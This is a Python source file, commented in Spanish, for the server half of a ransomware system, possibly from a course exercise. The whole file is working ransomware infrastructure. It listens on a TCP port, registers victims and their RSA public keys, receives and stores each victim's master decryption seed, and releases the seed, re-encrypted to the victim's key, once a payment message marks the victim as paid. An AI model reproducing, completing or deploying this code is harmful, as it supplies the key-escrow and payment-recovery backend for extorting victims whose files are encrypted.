"""
servidor/servidor.py
Rol: Alice. Registra víctimas, recibe la semilla maestra (modelo B),
persiste el estado y atiende la recuperación por pago.
"""

import sys
import json
import base64
import socket
from pathlib import Path
from threading import Thread

sys.path.append(str(Path(__file__).resolve().parent.parent))

from comun.transporte import enviar_mensaje, recibir_mensaje
from comun.crypto_common import (
    generar_par_rsa, exportar_publica,
    desencapsular_oaep, encapsular_oaep,
)
from Crypto.PublicKey import RSA

HOST = "0.0.0.0"
PUERTO = 5000

CARPETA_DATOS = Path(__file__).resolve().parent / "datos"
RUTA_CLAVE_SERVIDOR = CARPETA_DATOS / "clave_servidor.pem"
RUTA_REGISTRO = CARPETA_DATOS / "registro.json"


# ---------------------------------------------------------------------------
# Persistencia
# ---------------------------------------------------------------------------

def cargar_o_generar_clave_servidor():
    CARPETA_DATOS.mkdir(parents=True, exist_ok=True)
    if RUTA_CLAVE_SERVIDOR.exists():
        clave_privada = RSA.import_key(RUTA_CLAVE_SERVIDOR.read_bytes())
    else:
        clave_privada, _ = generar_par_rsa(2048)
        RUTA_CLAVE_SERVIDOR.write_bytes(clave_privada.export_key())
        print("Clave RSA del servidor generada y guardada.")
    return clave_privada, clave_privada.publickey()

def cargar_registro():
    if RUTA_REGISTRO.exists():
        return json.loads(RUTA_REGISTRO.read_text(encoding="utf-8"))
    return {}

def guardar_registro(registro):
    RUTA_REGISTRO.write_text(json.dumps(registro, indent=2), encoding="utf-8")


# ---------------------------------------------------------------------------
# Manejo de una conexión
# ---------------------------------------------------------------------------

def atender_conexion(conexion, clave_privada_servidor, registro, pk_servidor_exportada):
    with conexion:
        while True:
            try:
                mensaje = recibir_mensaje(conexion)
            except (ConnectionError, ValueError, json.JSONDecodeError) as error:
                print("Conexión cerrada por error:", error)
                return
            if mensaje is None:
                return

            tipo = mensaje.get("tipo")

            if tipo == "registro":
                manejar_registro(conexion, mensaje, registro, pk_servidor_exportada)

            elif tipo == "entrega_semilla":
                manejar_entrega_semilla(conexion, mensaje, clave_privada_servidor, registro)

            elif tipo == "recuperar_pago":
                manejar_recuperacion_pago(conexion, mensaje, registro)

            else:
                enviar_mensaje(conexion, {"tipo": "error", "detalle": "Tipo de mensaje no reconocido."})


def manejar_registro(conexion, mensaje, registro, pk_servidor_exportada):
    id_victima = mensaje["idV"]
    pkv_n = mensaje["pkv_n"]
    pkv_e = mensaje["pkv_e"]

    if id_victima not in registro:
        registro[id_victima] = {
            "pkv_n": pkv_n, "pkv_e": pkv_e,
            "sV_hex": None, "pagado": False,
        }
        guardar_registro(registro)
        print(f"Víctima registrada: {id_victima}")
    else:
        # Repetir el registro no debe crear otra entrada ni borrar sV existente.
        print(f"Víctima ya registrada, se ignora duplicado: {id_victima}")

    enviar_mensaje(conexion, {
        "tipo": "registro_ok",
        "pks_n": pk_servidor_exportada["n"],
        "pks_e": pk_servidor_exportada["e"],
    })


def manejar_entrega_semilla(conexion, mensaje, clave_privada_servidor, registro):
    id_victima = mensaje["idV"]
    if id_victima not in registro:
        enviar_mensaje(conexion, {"tipo": "error", "detalle": "Víctima no registrada."})
        return

    encapsulacion = base64.b64decode(mensaje["encapsulacion_b64"])
    try:
        sV = desencapsular_oaep(clave_privada_servidor, encapsulacion)
    except (ValueError, TypeError) as error:
        enviar_mensaje(conexion, {"tipo": "error", "detalle": f"No se pudo desencapsular: {error}"})
        return

    registro[id_victima]["sV_hex"] = sV.hex()
    guardar_registro(registro)
    print(f"Semilla maestra recibida y guardada para: {id_victima}")

    enviar_mensaje(conexion, {"tipo": "entrega_ok", "idV": id_victima})


def manejar_recuperacion_pago(conexion, mensaje, registro):
    id_victima = mensaje["idV"]
    entrada = registro.get(id_victima)

    if entrada is None or entrada["sV_hex"] is None:
        enviar_mensaje(conexion, {"tipo": "error", "detalle": "No hay semilla registrada para esa víctima."})
        return

    entrada["pagado"] = True
    guardar_registro(registro)
    print(f"Pago registrado para: {id_victima}")

    # Siempre se usa la pkV guardada en el registro, nunca una enviada en la solicitud.
    pk_victima = RSA.construct((int(entrada["pkv_n"]), int(entrada["pkv_e"])))
    sV = bytes.fromhex(entrada["sV_hex"])
    encapsulacion = encapsular_oaep(pk_victima, sV)

    enviar_mensaje(conexion, {
        "tipo": "recuperacion",
        "idV": id_victima,
        "encapsulacion_b64": base64.b64encode(encapsulacion).decode("ascii"),
    })


# ---------------------------------------------------------------------------
# Punto de entrada
# ---------------------------------------------------------------------------

def main():
    clave_privada_servidor, clave_publica_servidor = cargar_o_generar_clave_servidor()
    pk_servidor_exportada = exportar_publica(clave_publica_servidor)
    registro = cargar_registro()

    escucha = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escucha.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escucha.bind((HOST, PUERTO))
    escucha.listen()
    print(f"Servidor escuchando en {HOST}:{PUERTO}")

    try:
        while True:
            conexion, direccion = escucha.accept()
            print("Conexión aceptada de:", direccion)
            hilo = Thread(
                target=atender_conexion,
                args=(conexion, clave_privada_servidor, registro, pk_servidor_exportada),
                daemon=True,
            )
            hilo.start()
    except KeyboardInterrupt:
        print("\nServidor detenido.")
    finally:
        escucha.close()


if __name__ == "__main__":
    main()